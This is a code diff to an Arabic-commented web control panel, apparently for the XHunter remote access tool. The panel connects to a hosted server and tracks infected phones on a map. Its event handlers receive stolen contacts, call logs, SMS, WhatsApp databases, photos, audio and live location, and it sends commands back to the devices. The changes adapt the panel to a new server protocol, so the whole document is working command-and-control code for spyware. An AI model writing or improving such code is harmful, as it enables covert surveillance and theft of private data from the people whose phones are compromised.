@@ -609,7 +609,7 @@
         const notificationMessage = document.getElementById('notificationMessage');
 
         // بيانات التطبيق
-        let devices = [];
+        let devices = [];            // مصفوفة الأجهزة (نحافظ على واجهة العرض كما هي)
         let map = null;
         let markers = {};
         let selectedDevice = null;
@@ -634,6 +634,56 @@
             notification.classList.remove('show');
         }
 
+        // ---------- دوال مساعدة للتعامل مع بيانات السيرفر ----------
+        function findDeviceIndex(id) {
+            return devices.findIndex(d => d && d.id === id);
+        }
+
+        function normalizeServerDevice(d) {
+            // يحوّل شكل الجهاز القادم من السيرفر إلى الحقول التي يتوقعها الواجهة (name, id, lat, lng, lastSeen, os, ...)
+            const out = Object.assign({}, d);
+            // اسم الجهاز: model أو name أو userAgent
+            out.name = out.name || out.model || out.userAgent || out.id;
+            // lastLocation إلى lat/lng
+            if (out.lastLocation) {
+                const loc = out.lastLocation;
+                // قد تكون الحقول lat/lon أو latitude/longitude
+                out.lat = loc.lat ?? loc.latitude ?? loc.lat;
+                out.lng = loc.lon ?? loc.longitude ?? loc.lng;
+                if (loc.accuracy) out.accuracy = loc.accuracy;
+            }
+            // قد يرسل السيرفر حقول منفصلة عن الموقع عبر device.lastLocation أو device.location
+            if (out.location) {
+                out.lat = out.lat ?? out.location.lat ?? out.location.latitude;
+                out.lng = out.lng ?? out.location.lon ?? out.location.longitude;
+            }
+            // lastSeen: إذا أتى كرقم (timestamp) نحتفظ به، وإلا نضع الآن
+            out.lastSeen = out.lastSeen ? out.lastSeen : (Date.now());
+            return out;
+        }
+
+        function upsertDeviceFromServer(deviceObj) {
+            if (!deviceObj || !deviceObj.id) return null;
+            const normalized = normalizeServerDevice(deviceObj);
+            const idx = findDeviceIndex(normalized.id);
+            if (idx === -1) {
+                devices.push(normalized);
+                return normalized;
+            } else {
+                // ندمج الحقول (لا نحذف الحقول الموجودة)
+                devices[idx] = { ...devices[idx], ...normalized };
+                return devices[idx];
+            }
+        }
+
+        function updateAllViews() {
+            statusCount.textContent = devices.length;
+            updateDeviceList(devices);
+            updateDeviceSelect(devices);
+            updateMap(devices);
+        }
+        // --------------------------------------------------------
+
         // تهيئة الخريطة
         function initMap() {
             map = L.map('map').setView([24.0, 45.0], 5);
@@ -643,11 +693,11 @@
             }).addTo(map);
         }
 
-        // تحديث قائمة الأجهزة
+        // تحديث قائمة الأجهزة (لم أغير هذه الدالة — تعمل على مصفوفة devices كما كانت)
         function updateDeviceList(devicesData) {
             deviceList.innerHTML = '';
             
-            if (devicesData.length === 0) {
+            if (!devicesData || devicesData.length === 0) {
                 deviceList.innerHTML = '<div class="device-card">لا توجد أجهزة متصلة</div>';
                 return;
             }
@@ -661,9 +711,9 @@
                         <div class="device-id">${device.id}</div>
                     </div>
                     <div class="device-details">
-                        <div><i class="fas fa-clock"></i> آخر ظهور: ${new Date(device.lastSeen).toLocaleString('ar-SA')}</div>
-                        <div><i class="fas fa-map-marker-alt"></i> الموقع: ${device.lat ? device.lat.toFixed(4) : 'N/A'}, ${device.lng ? device.lng.toFixed(4) : 'N/A'}</div>
-                        <div><i class="fas fa-satellite"></i> الحالة: متصل</div>
+                        <div><i class="fas fa-clock"></i> آخر ظهور: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar-SA') : '—'}</div>
+                        <div><i class="fas fa-map-marker-alt"></i> الموقع: ${device.lat != null ? Number(device.lat).toFixed(4) : 'N/A'}, ${device.lng != null ? Number(device.lng).toFixed(4) : 'N/A'}</div>
+                        <div><i class="fas fa-satellite"></i> الحالة: ${device.socketId ? 'متصل' : 'غير متصل'}</div>
                     </div>
                 `;
                 
@@ -690,17 +740,18 @@
 
         // تحديث الخريطة
         function updateMap(devicesData) {
+            if (!map) return;
             // إزالة العلامات القديمة
             for (const id in markers) {
-                map.removeLayer(markers[id]);
+                try { map.removeLayer(markers[id]); } catch(e){}
             }
             markers = {};
             
             // إضافة العلامات الجديدة
             devicesData.forEach(device => {
-                if (device.lat && device.lng) {
+                if (device.lat != null && device.lng != null && !isNaN(device.lat) && !isNaN(device.lng)) {
                     const marker = L.marker([device.lat, device.lng]).addTo(map)
-                        .bindPopup(`<b>${device.name || 'جهاز غير معروف'}</b><br>آخر ظهور: ${new Date(device.lastSeen).toLocaleString('ar-SA')}`);
+                        .bindPopup(`<b>${device.name || 'جهاز غير معروف'}</b><br>آخر ظهور: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar-SA') : '—'}`);
                     
                     markers[device.id] = marker;
                 }
@@ -723,13 +774,13 @@
                     <h4><i class="fas fa-info-circle"></i> معلومات الأساسية</h4>
                     <p><strong>اسم الجهاز:</strong> ${device.name || 'غير معروف'}</p>
                     <p><strong>المعرف:</strong> ${device.id}</p>
-                    <p><strong>آخر ظهور:</strong> ${new Date(device.lastSeen).toLocaleString('ar-SA')}</p>
+                    <p><strong>آخر ظهور:</strong> ${device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar-SA') : '—'}</p>
                     <p><strong>نظام التشغيل:</strong> ${device.os || 'غير معروف'}</p>
                 </div>
                 
                 <div class="data-card">
                     <h4><i class="fas fa-map-marked-alt"></i> الموقع</h4>
-                    <p><strong>الإحداثيات:</strong> ${device.lat ? device.lat.toFixed(6) : 'N/A'}, ${device.lng ? device.lng.toFixed(6) : 'N/A'}</p>
+                    <p><strong>الإحداثيات:</strong> ${device.lat != null ? Number(device.lat).toFixed(6) : 'N/A'}, ${device.lng != null ? Number(device.lng).toFixed(6) : 'N/A'}</p>
                     <p><strong>الدقة:</strong> ≈ ${device.accuracy || 'غير معروف'} متر</p>
                     ${device.address ? `<p><strong>العنوان:</strong> ${device.address}</p>` : ''}
                 </div>
@@ -743,9 +794,9 @@
             `;
             
             // توجيه الخريطة إلى موقع الجهاز
-            if (map && device.lat && device.lng && markers[device.id]) {
+            if (map && device.lat != null && device.lng != null && markers[device.id]) {
                 map.setView([device.lat, device.lng], 15);
-                markers[device.id].openPopup();
+                try { markers[device.id].openPopup(); } catch(e){}
             }
         }
 
@@ -800,7 +851,7 @@
             lastEvent.textContent = new Date().toLocaleString('ar-SA');
         }
 
-        // الاتصال بالخادم
+        // ---------- الاتصال بالخادم (معدّل ليتوافق مع server.js) ----------
         function connectToServer() {
             try {
                 socket = io('https://xhunter-1-2not.onrender.com', {
@@ -815,8 +866,8 @@
                     showNotification('تم الاتصال بالخادم بنجاح', 'success');
                     addLog('تم الاتصال بالخادم بنجاح', 'success');
                     
-                    // طلب بيانات الأجهزة بعد الاتصال
-                    socket.emit('getDevices');
+                    // اطلب لقطة الأجهزة (السيرفر يرد بإرسال حدث 'join' لكل جهاز)
+                    socket.emit('adminJoin');
                 });
                 
                 socket.on('disconnect', () => {
@@ -830,27 +881,86 @@
                 socket.on('connect_error', (error) => {
                     console.error('خطأ في الاتصال:', error);
                     showNotification('فشل في الاتصال بالخادم', 'error');
-                    addLog('فشل في الاتصال بالخادم: ' + error.message, 'error');
+                    addLog('فشل في الاتصال بالخادم: ' + (error.message || error), 'error');
                 });
-                
+
+                // ----- التوافق: لو السيرفر قديمًا أرسل مصفوفة devices (احتمالي) -----
                 socket.on('devices', (devicesData) => {
-                    devices = devicesData;
-                    statusCount.textContent = devices.length;
-                    updateDeviceList(devices);
-                    updateDeviceSelect(devices);
-                    updateMap(devices);
-                    addLog(`تم استقبال بيانات ${devices.length} جهاز`, 'success');
-                });
-                
-                socket.on('deviceData', (data) => {
-                    addLog(`تم استقبال بيانات من الجهاز ${data.deviceId}: ${data.type}`, 'success');
-                    
-                    // تحديث بيانات الجهاز المحدد إذا كان معروضًا
-                    if (selectedDevice && selectedDevice.id === data.deviceId) {
-                        selectDevice({...selectedDevice, ...data.data});
+                    // توافق رجعي: لو استلمنا مصفوفة، نستخدمها كما في الكود القديم
+                    if (Array.isArray(devicesData)) {
+                        devices = devicesData.map(d => normalizeServerDevice(d));
+                        updateAllViews();
+                        addLog(`تم استقبال بيانات ${devices.length} جهاز`, 'success');
                     }
                 });
-                
+
+                // ----- الـ event الأهم: انضمام جهاز (server.js يرسل 'join' لكل جهاز) -----
+                socket.on('join', (device) => {
+                    const dev = upsertDeviceFromServer(device);
+                    updateAllViews();
+                    addLog(`انضم/تحدث جهاز: ${dev.id}`, 'success');
+                });
+
+                // ----- تحديثات متفرقة من السيرفر: deviceInfo, battery, networkInfo, getLocation, photo, audio, ... -----
+                const serverEvents = ['deviceInfo','battery','networkInfo','getLocation','photo','audio',
+                                      'getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
+                serverEvents.forEach(ev => {
+                    socket.on(ev, (payload) => {
+                        // payload متوقع بالشكل { id, data } أو { id, extra } أو في بعض الأحيان شكل آخر
+                        const id = payload && (payload.id || payload.deviceId);
+                        if (!id) {
+                            // قد يكون السيرفر أرسل شكل الجهاز كاملاً
+                            if (payload && payload.id) {
+                                const dev = upsertDeviceFromServer(payload);
+                                updateAllViews();
+                                addLog(`حدث ${ev} (payload كتلة جهاز) لـ ${dev.id}`, 'info');
+                            }
+                            return;
+                        }
+
+                        // تأكد وجود الجهاز بالسجل
+                        let idx = findDeviceIndex(id);
+                        if (idx === -1) {
+                            devices.push({ id });
+                            idx = devices.length - 1;
+                        }
+
+                        // البيانات الفعلية
+                        const data = payload.data ?? payload.extra ?? payload;
+
+                        // إذا كانت بيانات الموقع
+                        if (ev === 'getLocation' || (data && (data.lat || data.lon || data.latitude || data.longitude))) {
+                            const lat = data.lat ?? data.latitude ?? data.latitude;
+                            const lng = data.lon ?? data.longitude ?? data.lng;
+                            if (lat != null && lng != null) {
+                                devices[idx].lat = Number(lat);
+                                devices[idx].lng = Number(lng);
+                                devices[idx].accuracy = data.accuracy ?? devices[idx].accuracy;
+                            }
+                        }
+
+                        // بعض التحديثات تحفظ مباشرة
+                        if (ev === 'battery') devices[idx].battery = data;
+                        if (ev === 'networkInfo') devices[idx].network = data;
+                        if (ev === 'deviceInfo') {
+                            // server.js يرسل { id, extra }
+                            devices[idx].extra = data;
+                            // حاول استخراج بعض الحقول من extra إن وجدت
+                            if (data && data.model) devices[idx].name = devices[idx].name || data.model;
+                            if (data && data.os) devices[idx].os = devices[idx].os || data.os;
+                        }
+
+                        // حدث عام: نحدث lastSeen و socketId إن توافر
+                        devices[idx].lastSeen = Date.now();
+                        if (payload.socketId) devices[idx].socketId = payload.socketId;
+                        if (payload.socket) devices[idx].socketId = payload.socket;
+
+                        updateAllViews();
+                        addLog(`وصل تحديث (${ev}) من ${id}`, 'info');
+                    });
+                });
+
+                // نتائج الأوامر (إن أعادها السيرفر)
                 socket.on('commandResult', (result) => {
                     commandStatus.style.display = 'none';
                     if (result.success) {
@@ -861,10 +971,10 @@
                         showNotification(`فشل في تنفيذ الأمر: ${result.message}`, 'error');
                     }
                 });
-                
+
                 socket.on('error', (error) => {
-                    addLog(`خطأ: ${error.message}`, 'error');
-                    showNotification(`خطأ: ${error.message}`, 'error');
+                    addLog(`خطأ: ${error && error.message ? error.message : JSON.stringify(error)}`, 'error');
+                    showNotification(`خطأ: ${error && error.message ? error.message : 'حدث خطأ'}`, 'error');
                 });
                 
                 socket.on('log', (log) => {
@@ -922,6 +1032,7 @@
                         data: data ? JSON.parse(data) : {}
                     };
                     
+                    // نرسل الأمر إلى السيرفر كما في الكود السابق — إذا السيرفر يدعم اسم حدث محدد يمكن تعديله لاحقًا
                     socket.emit('sendCommand', command);
                     addLog(`تم إرسال الأمر ${action} إلى الجهاز ${deviceId}`);
                     
@@ -944,7 +1055,8 @@
                 }
                 
                 if (isConnected) {
-                    socket.emit('getDevices');
+                    // اطلب لقطة الأجهزة مجدداً من السيرفر (adminJoin)
+                    socket.emit('adminJoin');
                     addLog('جاري تحديث بيانات الأجهزة...');
                 }
             });
@@ -962,4 +1074,4 @@
         document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
-    </html>
+</html>
